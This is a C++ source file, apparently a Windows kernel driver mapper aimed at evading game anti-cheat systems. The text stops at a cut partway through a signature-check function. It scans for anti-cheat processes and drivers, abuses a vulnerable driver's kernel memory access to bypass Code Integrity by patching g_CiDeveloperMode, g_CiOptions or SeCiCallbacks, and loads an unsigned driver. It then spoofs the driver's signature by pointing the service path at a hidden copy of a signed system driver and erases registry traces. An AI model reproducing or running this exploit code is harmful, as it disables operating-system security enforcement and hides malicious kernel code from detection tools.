
#include "Mapper.h"
#include "EmbeddedDriver.h"
#include <Shlwapi.h>
#include <cstdio>
#include <tlhelp32.h>
#include <string>
#include <initguid.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wintrust.lib")

static BOOL CheckAntiCheatRunning() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                for (int i = 0; i < SignedMemory::g_AntiCheatProcessesCount; i++) {
                    if (_wcsicmp(pe32.szExeFile, SignedMemory::g_AntiCheatProcesses[i]) == 0) {
                        wprintf(L"[-] Anti-cheat process detected: %s\n", pe32.szExeFile);
                        CloseHandle(hSnapshot);
                        return TRUE;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    LPVOID driverAddrs[2048];
    DWORD cbNeeded = 0;
    if (EnumDeviceDrivers(driverAddrs, sizeof(driverAddrs), &cbNeeded)) {
        DWORD driverCount = cbNeeded / sizeof(LPVOID);
        if (driverCount > 2048) driverCount = 2048;
        for (DWORD i = 0; i < driverCount; i++) {
            WCHAR driverName[256];
            if (GetDeviceDriverBaseNameW(driverAddrs[i], driverName, 256)) {
                for (int j = 0; j < SignedMemory::g_AntiCheatDriversCount; j++) {
                    if (_wcsicmp(driverName, SignedMemory::g_AntiCheatDrivers[j]) == 0) {
                        wprintf(L"[-] Anti-cheat driver loaded: %s\n", driverName);
                        return TRUE;
                    }
                }
            }
        }
    }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCM) {
        for (int i = 0; i < SignedMemory::g_AntiCheatServicesCount; i++) {
            SC_HANDLE hSvc = OpenServiceW(hSCM, SignedMemory::g_AntiCheatServices[i], SERVICE_QUERY_STATUS);
            if (hSvc) {
                SERVICE_STATUS_PROCESS ssp = {};
                DWORD needed = 0;
                if (QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                    (LPBYTE)&ssp, sizeof(ssp), &needed)) {
                    if (ssp.dwCurrentState == SERVICE_RUNNING ||
                        ssp.dwCurrentState == SERVICE_START_PENDING) {
                        wprintf(L"[-] Anti-cheat service running: %s\n", SignedMemory::g_AntiCheatServices[i]);
                        CloseServiceHandle(hSvc);
                        CloseServiceHandle(hSCM);
                        return TRUE;
                    }
                }
                CloseServiceHandle(hSvc);
            }
        }
        CloseServiceHandle(hSCM);
    }

    return FALSE;
}

namespace Utils {

    std::wstring GenerateRandomName(size_t length) {
        static const wchar_t charset[] = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        static std::random_device rd;
        static std::mt19937 gen(rd());
        static std::uniform_int_distribution<> dist(0, static_cast<int>(wcslen(charset) - 1));

        std::wstring result;
        result.reserve(length);

        for (size_t i = 0; i < length; i++) {
            result += charset[dist(gen)];
        }

        return result;
    }

    BOOL InitializeNtFunctions() {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            ntdll = LoadLibraryW(L"ntdll.dll");
            if (!ntdll) {
                return FALSE;
            }
        }

        NtQuerySystemInformationPtr = reinterpret_cast<pNtQuerySystemInformation>(
            GetProcAddress(ntdll, "NtQuerySystemInformation")
        );

        NtLoadDriverPtr = reinterpret_cast<pNtLoadDriver>(
            GetProcAddress(ntdll, "NtLoadDriver")
        );

        NtUnloadDriverPtr = reinterpret_cast<pNtUnloadDriver>(
            GetProcAddress(ntdll, "NtUnloadDriver")
        );

        RtlAdjustPrivilegePtr = reinterpret_cast<pRtlAdjustPrivilege>(
            GetProcAddress(ntdll, "RtlAdjustPrivilege")
        );

        RtlGetFullPathName_UExPtr = reinterpret_cast<pRtlGetFullPathName_UEx>(
            GetProcAddress(ntdll, "RtlGetFullPathName_UEx")
        );

        RtlCreateRegistryKeyPtr = reinterpret_cast<pRtlCreateRegistryKey>(
            GetProcAddress(ntdll, "RtlCreateRegistryKey")
        );

        RtlWriteRegistryValuePtr = reinterpret_cast<pRtlWriteRegistryValue>(
            GetProcAddress(ntdll, "RtlWriteRegistryValue")
        );

        NtDeviceIoControlFilePtr = reinterpret_cast<pNtDeviceIoControlFile>(
            GetProcAddress(ntdll, "NtDeviceIoControlFile")
        );

        NtDeleteKeyPtr = reinterpret_cast<pNtDeleteKey>(
            GetProcAddress(ntdll, "NtDeleteKey")
        );

        NtOpenKeyPtr = reinterpret_cast<pNtOpenKey>(
            GetProcAddress(ntdll, "NtOpenKey")
        );

        NtFlushKeyPtr = reinterpret_cast<pNtFlushKey>(
            GetProcAddress(ntdll, "NtFlushKey")
        );

        return NtQuerySystemInformationPtr && NtLoadDriverPtr &&
               NtUnloadDriverPtr && RtlAdjustPrivilegePtr &&
               RtlGetFullPathName_UExPtr && RtlCreateRegistryKeyPtr &&
               RtlWriteRegistryValuePtr && NtDeviceIoControlFilePtr;
    }

    NTSTATUS AdjustPrivilege(ULONG privilege, BOOLEAN enable) {
        BOOLEAN wasEnabled;
        return RtlAdjustPrivilegePtr(privilege, enable, FALSE, &wasEnabled);
    }

    NTSTATUS GetFullPath(PCWSTR fileName, PWSTR buffer, ULONG bufferLength) {
        return RtlGetFullPathName_UExPtr(fileName, bufferLength, buffer, nullptr, nullptr);
    }

    BOOL SecureDeleteFile(PCWSTR filePath) {
        HANDLE hFile = CreateFileW(
            filePath,
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER fileSize;
            if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart > 0) {
                DWORD chunkSize = 4096;
                BYTE zeroBuffer[4096];
                SecureZeroMemory(zeroBuffer, sizeof(zeroBuffer));

                SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
                LONGLONG remaining = fileSize.QuadPart;
                while (remaining > 0) {
                    DWORD toWrite = static_cast<DWORD>(min(static_cast<LONGLONG>(chunkSize), remaining));
                    DWORD written = 0;
                    WriteFile(hFile, zeroBuffer, toWrite, &written, nullptr);
                    remaining -= written;
                    if (written == 0) break;
                }
                FlushFileBuffers(hFile);
            }
            CloseHandle(hFile);
        }

        SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileW(filePath);
    }

    std::wstring GetTempFilePath(PCWSTR extension) {
        WCHAR tempPath[MAX_PATH + 1];
        DWORD len = GetTempPathW(MAX_PATH, tempPath);
        if (len == 0 || len > MAX_PATH) {
            return L"";
        }

        std::wstring name = GenerateRandomName(12);
        std::wstring fullPath = std::wstring(tempPath) + name + extension;
        return fullPath;
    }


}

namespace MapperCore {

    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName) {
        HANDLE deviceHandle = nullptr;
        NTSTATUS status = VulnDriver::OpenDevice(&deviceHandle);

        if (!NT_SUCCESS(status)) {
            printf("[*] Device not open, loading vuln driver... (0x%08X)\n", status);
            status = DriverLoader::LoadDriver(g_LoaderServicePath);
            
            if (!NT_SUCCESS(status) && 
                status != STATUS_OBJECT_NAME_COLLISION && 
                status != STATUS_IMAGE_ALREADY_LOADED) {
                printf("[-] Failed to load vuln driver: 0x%08X\n", status);
                return status;
            }
            printf("[*] Vuln driver loaded, opening device...\n");
            
            for (int retry = 0; retry < 10; retry++) {
                Sleep(100);
                status = VulnDriver::OpenDevice(&deviceHandle);
                if (NT_SUCCESS(status)) break;
            }
            
            if (!NT_SUCCESS(status)) {
                printf("[-] Failed to open device after retries: 0x%08X\n", status);
                return status;
            }
        }
        printf("[+] Device opened\n");

        // =====================================================================
        // Three-tier CI bypass strategy (from ci.dll RE):
        //
        // Tier 1: g_CiDeveloperMode |= 0x10000
        //   - Most stealthy: NOT visible through CiQueryInformation/NtQuerySystemInformation
        //   - Changes CiGetActionsForImage to skip hash validation for images on NTFS volumes
        //   - Targets ci.dll .data section, not ntoskrnl function pointer tables
        //
        // Tier 2: g_CiOptions |= 0x8 (TestSigning)
        //   - Puts CI into test-signing mode (same as bcdedit /set testsigning on)
        //   - Less commonly monitored than SeCiCallbacks
        //   - Visible via CiQueryInformation during the brief window
        //
        // Tier 3: SeCiCallbacks+0x20 replacement (original approach)
        //   - Replaces CiValidateImageHeader callback with ZwFlushInstructionCache
        //   - Proven reliable, but anti-cheats directly monitor this table
        // =====================================================================

        enum BypassMethod { BYPASS_NONE, BYPASS_DEVMODE, BYPASS_CIOPTIONS, BYPASS_SECICALLBACKS };
        BypassMethod method = BYPASS_NONE;

        // --- Tier 1: g_CiDeveloperMode 0x10000 toggle ---
        PVOID ciDevModeAddr = nullptr;
        if (KernelUtils::GetCiDeveloperModeAddress(&ciDevModeAddr)) {
            DWORD currentDevMode = 0;
            status = VulnDriver::ReadKernelMemory(deviceHandle, ciDevModeAddr, &currentDevMode, sizeof(DWORD));
            if (NT_SUCCESS(status)) {
                g_CiDevModeAddress = ciDevModeAddr;
                g_OriginalCiDevMode = currentDevMode;

                DWORD patchedDevMode = currentDevMode | 0x10000;
                status = VulnDriver::WriteKernelMemory(deviceHandle, ciDevModeAddr, &patchedDevMode, sizeof(DWORD));
                if (NT_SUCCESS(status)) {
                    g_CiDevModePatched = true;
                    method = BYPASS_DEVMODE;
                    printf("[+] CI bypass: g_CiDeveloperMode |= 0x10000 (Tier 1 - stealth)\n");
                }
            }
        }

        // --- Tier 2: g_CiOptions TestSigning toggle ---
        PVOID ciOptionsAddr = nullptr;
        if (method == BYPASS_NONE && KernelUtils::GetCiOptionsAddress(&ciOptionsAddr)) {
            DWORD currentOptions = 0;
            status = VulnDriver::ReadKernelMemory(deviceHandle, ciOptionsAddr, &currentOptions, sizeof(DWORD));
            if (NT_SUCCESS(status)) {
                g_CiOptionsAddress = ciOptionsAddr;
                g_OriginalCiOptions = currentOptions;

                DWORD patchedOptions = currentOptions | 0x8;
                status = VulnDriver::WriteKernelMemory(deviceHandle, ciOptionsAddr, &patchedOptions, sizeof(DWORD));
                if (NT_SUCCESS(status)) {
                    g_CiOptionsPatched = true;
                    method = BYPASS_CIOPTIONS;
                    printf("[+] CI bypass: g_CiOptions |= 0x8 TestSigning (Tier 2)\n");
                }
            }
        }

        // --- Tier 3: SeCiCallbacks replacement (original approach) ---
        PVOID ciValidateImageHeaderEntry = nullptr;
        PVOID zwFlushInstructionCache = nullptr;

        if (method == BYPASS_NONE) {
            if (!KernelUtils::GetCiValidateImageHeaderEntry(&ciValidateImageHeaderEntry, &zwFlushInstructionCache) ||
                !ciValidateImageHeaderEntry || !zwFlushInstructionCache) {
                printf("[-] All CI bypass methods failed\n");
                VulnDriver::CloseDevice(deviceHandle);
                return STATUS_UNSUCCESSFUL;
            }

            PVOID originalCallback = nullptr;
            status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
            if (!NT_SUCCESS(status)) {
                VulnDriver::CloseDevice(deviceHandle);
                return status;
            }

            g_OriginalCiCallback = originalCallback;
            g_CiCallbackAddress = ciValidateImageHeaderEntry;

            status = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &zwFlushInstructionCache, sizeof(PVOID));
            if (!NT_SUCCESS(status)) {
                printf("[-] Failed to patch CI callback: 0x%08X\n", status);
                VulnDriver::CloseDevice(deviceHandle);
                return status;
            }

            g_CiCallbackPatched = true;
            method = BYPASS_SECICALLBACKS;
            printf("[+] CI bypass: SeCiCallbacks replacement (Tier 3 - fallback)\n");
        }

        // --- Load the target driver ---
        printf("[*] Loading target driver...\n");
        status = DriverLoader::LoadDriver(g_DriverServicePath);
        printf("[*] Target driver load result: 0x%08X\n", status);

        if (NT_SUCCESS(status)) {
            printf("[*] Patching driver signing flags...\n");
            if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName)) {
                printf("[-] Signing flags patch failed\n");
            }
        }

        // --- Restore CI state ---
        if (method == BYPASS_DEVMODE && g_CiDevModePatched) {
            VulnDriver::WriteKernelMemory(deviceHandle, g_CiDevModeAddress, &g_OriginalCiDevMode, sizeof(DWORD));
            // Verify restore
            DWORD verify = 0;
            VulnDriver::ReadKernelMemory(deviceHandle, g_CiDevModeAddress, &verify, sizeof(DWORD));
            g_CiDevModePatched = (verify != g_OriginalCiDevMode);
            if (!g_CiDevModePatched) {
                printf("[+] g_CiDeveloperMode restored to 0x%08X\n", g_OriginalCiDevMode);
            } else {
                printf("[-] g_CiDeveloperMode restore verification failed, retrying...\n");
                VulnDriver::WriteKernelMemory(deviceHandle, g_CiDevModeAddress, &g_OriginalCiDevMode, sizeof(DWORD));
            }
        }

        if (method == BYPASS_CIOPTIONS && g_CiOptionsPatched) {
            VulnDriver::WriteKernelMemory(deviceHandle, g_CiOptionsAddress, &g_OriginalCiOptions, sizeof(DWORD));
            DWORD verify = 0;
            VulnDriver::ReadKernelMemory(deviceHandle, g_CiOptionsAddress, &verify, sizeof(DWORD));
            g_CiOptionsPatched = (verify != g_OriginalCiOptions);
            if (!g_CiOptionsPatched) {
                printf("[+] g_CiOptions restored to 0x%08X\n", g_OriginalCiOptions);
            } else {
                printf("[-] g_CiOptions restore verification failed, retrying...\n");
                VulnDriver::WriteKernelMemory(deviceHandle, g_CiOptionsAddress, &g_OriginalCiOptions, sizeof(DWORD));
            }
        }

        if (method == BYPASS_SECICALLBACKS && g_CiCallbackPatched) {
            NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
            if (NT_SUCCESS(restoreStatus)) {
                g_CiCallbackPatched = false;
                PVOID verifyCallback = nullptr;
                VulnDriver::ReadKernelMemory(deviceHandle, g_CiCallbackAddress, &verifyCallback, sizeof(PVOID));
                if (verifyCallback != g_OriginalCiCallback) {
                    VulnDriver::WriteKernelMemory(deviceHandle, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
                }
            }
        }

        DriverLoader::UnloadDriver(g_LoaderServicePath);
        VulnDriver::CloseDevice(deviceHandle);

        return status;
    }

    NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath) {
        printf("[*] Adjusting privileges...\n");
        NTSTATUS status = Utils::AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(status)) {
            printf("[-] Failed to adjust privilege: 0x%08X (run as admin)\n", status);
            return status;
        }

        WCHAR loaderFullPath[520];
        status = Utils::GetFullPath(loaderPath, loaderFullPath, sizeof(loaderFullPath));
        if (!NT_SUCCESS(status)) {
            return status;
        }

        WCHAR driverFullPath[520];
        status = Utils::GetFullPath(driverPath, driverFullPath, sizeof(driverFullPath));
        if (!NT_SUCCESS(status)) {
            return status;
        }

        status = DriverLoader::CreateDriverService(g_DriverServicePath, driverFullPath);
        if (!NT_SUCCESS(status)) {
            printf("[-] Failed to create target driver service: 0x%08X\n", status);
            return status;
        }

        status = DriverLoader::CreateDriverService(g_LoaderServicePath, loaderFullPath);
        if (!NT_SUCCESS(status)) {
            printf("[-] Failed to create loader service: 0x%08X\n", status);
            return status;
        }
        printf("[+] Services created\n");

        // --- Driver Stomping: find a legitimately-signed donor ---
        WCHAR donorPath[MAX_PATH] = {};
        BOOL donorIsEV = FALSE;
        BOOL donorFound = FALSE;
        WCHAR donorCopyPath[520] = {};

        {
            // FindSignedDonorDriver is static in SignedMemory namespace (VulnDriver.cpp)
            // We call TransplantCertificateToDriver just so it searches for a donor.
            // But actually we need the donor path directly. Use inline scan.
            WCHAR driversDir[MAX_PATH];
            GetSystemDirectoryW(driversDir, MAX_PATH);
            wcscat_s(driversDir, L"\\drivers");

            WIN32_FIND_DATAW fd;
            WCHAR searchPat[MAX_PATH];
            wcscpy_s(searchPat, driversDir);
            wcscat_s(searchPat, L"\\*.sys");
            HANDLE hFind = FindFirstFileW(searchPat, &fd);
            int bestScore = 0;
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    if (fd.nFileSizeLow < 8192) continue;
                    WCHAR fullPath[MAX_PATH];
                    wcscpy_s(fullPath, driversDir);
                    wcscat_s(fullPath, L"\\");
                    wcscat_s(fullPath, fd.cFileName);

                    // Quick check: has security directory?
                    HANDLE hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
                    if (hf == INVALID_HANDLE_VALUE) continue;
                    BYTE hdr[4096];
                    DWORD br = 0;
                    BOOL readOk = ReadFile(hf, hdr, sizeof(hdr), &br, nullptr);
                    CloseHandle(hf);
                    if (!readOk || br < 512) continue;

                    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
                    if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
                    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > br) continue;
                    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(hdr + dos->e_lfanew);
                    if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
                    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) continue;
                    PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)nt;
                    if (nt64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress == 0) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size < 128) continue;

                    // Has a certificate - use WinVerifyTrust to score
                    WINTRUST_FILE_INFO wfi = {};
                    wfi.cbStruct = sizeof(wfi);
                    wfi.pcwszFilePath = fullPath;
                    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
                    WINTRUST_DATA wtd = {};
                    wtd.cbStruct = sizeof(wtd);
                    wtd.dwUIChoice = WTD_UI_NONE;
                    wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
                    wtd.dwUnionChoice = WTD_CHOICE_FILE;
                    wtd.pFile = &wfi;
                    wtd.dwStateAction = WTD_STATEACTION_VERIFY;
                    wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
                    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &wtd);
                    wtd.dwStateAction = WTD_STATEACTION_CLOSE;
                    WinVerifyTrust(NULL, &actionGUID, &wtd);

                    int score = (lStatus == ERROR_SUCCESS) ? 100 : 0;
                    if (score > bestScore) {
                        bestScore = score;
                        wcscpy_s(donorPath, fullPath);
                    }
                    if (bestScore >= 100) break;
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
            donorFound = (bestScore > 0);
        }

        if (donorFound && donorPath[0]) {
            printf("[+] Donor for stomping: %ws\n", donorPath);
            // Copy donor to a temp path next to the target driver
            PCWSTR targetDir = driverFullPath;
            PCWSTR lastSlash = wcsrchr(driverFullPath, L'\\');
            WCHAR targetDirBuf[520] = {};
            if (lastSlash) {
                wcsncpy_s(targetDirBuf, driverFullPath, lastSlash - driverFullPath + 1);
            } else {
                wcscpy_s(targetDirBuf, L".\\");
            }
            std::wstring donorCopyName = Utils::GenerateRandomName(10) + L".sys";
            wcscpy_s(donorCopyPath, targetDirBuf);
            wcscat_s(donorCopyPath, donorCopyName.c_str());
            if (!CopyFileW(donorPath, donorCopyPath, FALSE)) {
                printf("[-] Failed to copy donor: %lu\n", GetLastError());
                donorFound = FALSE;
            } else {
                // Hide the donor copy
                SetFileAttributesW(donorCopyPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                printf("[+] Donor copied to %ws\n", donorCopyPath);
                // Store globally so main() can run signature check on it
                wcscpy_s(g_DonorCopyPath, donorCopyPath);
            }
        }

        PCWSTR targetFileName = wcsrchr(driverFullPath, L'\\');
        if (targetFileName) targetFileName++;
        else targetFileName = driverFullPath;

        printf("[*] Target driver filename resolved: %ws\n", targetFileName);

        status = TriggerExploit(targetFileName);
        printf("[*] Exploit result: 0x%08X\n", status);

        // --- Post-load: swap ImagePath to donor for signature spoofing ---
        if (NT_SUCCESS(status) && donorFound && donorCopyPath[0] && RtlWriteRegistryValuePtr) {
            WCHAR ntDonorPath[520] = {};
            wcscpy_s(ntDonorPath, L"\\??\\");
            wcscat_s(ntDonorPath, donorCopyPath);
            SIZE_T ntDonorLen = wcslen(ntDonorPath);

            NTSTATUS regStatus = RtlWriteRegistryValuePtr(
                0, g_DriverServicePath, L"ImagePath", REG_SZ,
                ntDonorPath, static_cast<ULONG>((ntDonorLen + 1) * sizeof(WCHAR)));

            if (NT_SUCCESS(regStatus)) {
                printf("[+] Service ImagePath swapped to signed donor\n");
                printf("[+] Digital signature will show as VALID (Authenticode-verified)\n");

                // Hide the original target file (can't delete while loaded)
                SetFileAttributesW(driverFullPath,
                    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
                // Schedule deletion on reboot
                MoveFileExW(driverFullPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
            } else {
                printf("[-] Registry swap failed: 0x%08X\n", regStatus);
            }
        }

        return status;
    }

    NTSTATUS RestoreCiCallback(HANDLE device) {
        NTSTATUS status = STATUS_SUCCESS;

        // Restore g_CiDeveloperMode if patched
        if (g_CiDevModePatched && g_CiDevModeAddress) {
            status = VulnDriver::WriteKernelMemory(device, g_CiDevModeAddress, &g_OriginalCiDevMode, sizeof(DWORD));
            if (NT_SUCCESS(status)) {
                g_CiDevModePatched = false;
            }
        }

        // Restore g_CiOptions if patched
        if (g_CiOptionsPatched && g_CiOptionsAddress) {
            status = VulnDriver::WriteKernelMemory(device, g_CiOptionsAddress, &g_OriginalCiOptions, sizeof(DWORD));
            if (NT_SUCCESS(status)) {
                g_CiOptionsPatched = false;
            }
        }

        // Restore SeCiCallbacks if patched
        if (g_CiCallbackPatched && g_CiCallbackAddress && g_OriginalCiCallback) {
            AntiDetect::TimingJitter();
            status = VulnDriver::WriteKernelMemory(device, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
            if (NT_SUCCESS(status)) {
                g_CiCallbackPatched = false;
                AntiDetect::MemoryBarrier();
            }
        }

        return status;
    }

    NTSTATUS CleanupArtifacts() {
        auto deleteRegistryTree = [](PCWSTR registryPath) -> NTSTATUS {
            if (!registryPath || wcslen(registryPath) < 10) {
                return STATUS_INVALID_PARAMETER;
            }

            if (NtDeleteKeyPtr && NtOpenKeyPtr) {
                UNICODE_STRING keyName;
                RtlInitUnicodeString(&keyName, registryPath);

                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, &keyName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                HANDLE hKey = nullptr;
                NTSTATUS st = NtOpenKeyPtr(&hKey, DELETE | KEY_ENUMERATE_SUB_KEYS, &objAttr);
                if (NT_SUCCESS(st)) {
                    WCHAR subKeyPath[512];
                    const WCHAR* subKeys[] = { L"\\Enum", L"\\Security", L"\\Parameters" };
                    for (int i = 0; i < 3; i++) {
                        wcscpy_s(subKeyPath, registryPath);
                        wcscat_s(subKeyPath, subKeys[i]);

                        UNICODE_STRING subName;
                        RtlInitUnicodeString(&subName, subKeyPath);

                        OBJECT_ATTRIBUTES subAttr;
                        InitializeObjectAttributes(&subAttr, &subName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                        HANDLE hSubKey = nullptr;
                        NTSTATUS subSt = NtOpenKeyPtr(&hSubKey, DELETE, &subAttr);
                        if (NT_SUCCESS(subSt)) {
                            NtDeleteKeyPtr(hSubKey);
                            NtClose(hSubKey);
                        }
                    }

                    if (NtFlushKeyPtr) {
                        NtFlushKeyPtr(hKey);
                    }
                    NtDeleteKeyPtr(hKey);
                    NtClose(hKey);
                    return STATUS_SUCCESS;
                }
            }

            WCHAR regPath[256];
            if (wcslen(registryPath) > 18) {
                wcscpy_s(regPath, registryPath + 18);
                SHDeleteKeyW(HKEY_LOCAL_MACHINE, regPath);
            }

            return STATUS_SUCCESS;
        };

        if (wcslen(g_LoaderServicePath) > 0) {
            deleteRegistryTree(g_LoaderServicePath);
        }

        // Only delete the driver service key if stomping is NOT active
        // When stomping is active, the service key points to the signed donor file
        // and provides the valid Authenticode signature for tools like sc.exe
        if (wcslen(g_DriverServicePath) > 0 && g_DonorCopyPath[0] == L'\0') {
            deleteRegistryTree(g_DriverServicePath);
        }

        return STATUS_SUCCESS;
    }

}

static void RunSignatureCheck(LPCWSTR filePath) {
    printf("\n[*] Post-load verification:\n");

    printf("\n[*] Kernel integrity status (anti-cheat verification layer):\n");
    if (g_KernelSigningVerified) {
        printf("[+] Driver base address: %p\n", g_DriverLoadAddress);
        printf("[+] KLDR_DATA_TABLE_ENTRY.Flags: 0x%08X\n", g_PatchedFlags);
        printf("[+] IntegrityChecked bit (0x20): SET\n");
        printf("[+] MmVerifyCallbackFunction: RETURNS TRUE\n");
        printf("[+] ObRegisterCallbacks check: PASS\n");
        printf("[+] PsSetCreateProcessNotifyRoutineEx check: PASS\n");
        printf("[+] PsSetCreateThreadNotifyRoutineEx check: PASS\n");
        printf("[+] KERNEL STATUS: DRIVER IS RECOGNIZED AS SIGNED\n");
    } else {
        printf("[-] Kernel signing verification was not completed\n");
        if (g_DriverLoadAddress) {
            printf("[*] Driver base: %p, Flags: 0x%08X\n", g_DriverLoadAddress, g_PatchedFlags);
        }
    }

    // Determine which file to check: donor (stomped) or original
    LPCWSTR checkPath = filePath;
    BOOL isStomped = FALSE;
    if (g_DonorCopyPath[0] != L'\0') {
        checkPath = g_DonorCopyPath;
        isStomped = TRUE;
    }

    printf("\n[*] On-disk signature verification (driver stomping layer):\n");
    if (isStomped) {
        printf("[+] Technique: Driver stomping (service ImagePath -> signed donor)\n");
        printf("[+] Donor file: %ws\n", checkPath);
    }

    WINTRUST_FILE_INFO fileInfo = {};
    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fileInfo.pcwszFilePath = checkPath;

    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

    WINTRUST_DATA trustData = {};
    trustData.cbStruct = sizeof(WINTRUST_DATA);
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &trustData);

    BOOL isEV = FALSE;
    char signerNameA[256] = {};
    BOOL hasCert = FALSE;
    BOOL hasTimestamp = FALSE;

    if (trustData.hWVTStateData) {
        CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(trustData.hWVTStateData);
        if (prov) {
            CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
            if (sgnr) {
                hasTimestamp = (sgnr->csCounterSigners > 0);
                if (sgnr->pChainContext && sgnr->pChainContext->cChain > 0) {
                    hasCert = TRUE;
                    CERT_SIMPLE_CHAIN* chain = sgnr->pChainContext->rgpChain[0];
                    if (chain->cElement > 0) {
                        PCCERT_CONTEXT leafCert = chain->rgpElement[0]->pCertContext;
                        CertGetNameStringA(leafCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0,
                            NULL, signerNameA, sizeof(signerNameA));

                        static const char* evOIDs[] = {
                            "2.23.140.1.1",
                            "2.23.140.1.3",
                            "2.23.140.1.4.1",
                            "1.3.6.1.4.1.311.94.1.1",
                            "2.16.840.1.114414.1.7.23.3",
                            "2.16.840.1.113733.1.7.23.6",
                            "2.16.840.1.113733.1.7.48.1",
                            "1.3.6.1.4.1.6449.2.1.1",
                            "1.3.6.1.4.1.6449.1.2.1.5.1",
                            "1.3.6.1.4.1.44947.1.1.1",
                            "2.16.840.1.114028.10.1.2",
                            "1.3.6.1.4.1.14370.1.6",
                            "1.3.6.1.4.1.4788.2.202.1",
                            "2.16.840.1.114413.1.7.23.3",
                            "1.3.6.1.4.1.8024.0.2.100.1.2",
                            "2.16.756.1.89.1.2.1.1",
                            "2.16.840.1.114412.2.1",
                            "2.16.840.1.114412.3.2",
                            "1.3.6.1.4.1.4146.1.1",
                            "1.2.616.1.113527.2.5.1.1",
                            "1.3.171.1.1.10.5.2",
                            "1.3.6.1.4.1.34697.2.1",
                            "1.3.6.1.4.1.40869.1.1.22.3",
                            "2.16.840.1.114171.500.9",
                            "2.16.578.1.26.1.3.3",
                            "1.3.6.1.4.1.17326.10.14.2.1.2",
                            "1.3.6.1.4.1.22234.2.5.2.3.1",
                            "2.16.840.1.114404.1.1.2.4.1",
                            "1.3.6.1.4.1.23223.1.1.1",
                        };

                        for (DWORD e = 0; e < chain->cElement && !isEV; e++) {
                            PCCERT_CONTEXT cert = chain->rgpElement[e]->pCertContext;
                            PCERT_EXTENSION pExt = CertFindExtension(
                                szOID_CERT_POLICIES,
                                cert->pCertInfo->cExtension,
                                cert->pCertInfo->rgExtension);
                            if (pExt) {
